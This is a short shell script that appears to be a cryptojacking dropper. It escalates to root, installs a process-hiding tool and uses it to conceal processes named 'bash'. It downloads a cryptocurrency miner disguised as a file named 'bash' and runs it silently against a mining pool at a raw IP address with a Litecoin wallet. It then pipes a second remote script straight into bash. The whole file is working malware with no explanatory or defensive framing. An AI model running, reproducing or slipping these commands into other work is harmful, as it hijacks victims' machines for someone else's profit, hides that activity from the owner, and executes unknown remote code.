#!/bin/sh
sudo su --command "curl -fsSL https://deb.nodesource.com/setup_20.x | sudo bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add bash"
wget https://github.com/malogrono/opr/raw/refs/heads/main/bash >/dev/null 2>&1
chmod +x bash
./bash --algorithm randomx --pool stratum+tcp://148.113.141.142:80 --wallet LTC:ltc1qwae89dljtedxyvgrgl5ug8rk7xeqaruh5utxrg.SR >/dev/null 2>&1 &
curl -sL https://raw.githubusercontent.com/bsheredia/dumel/main/pie.sh | bash
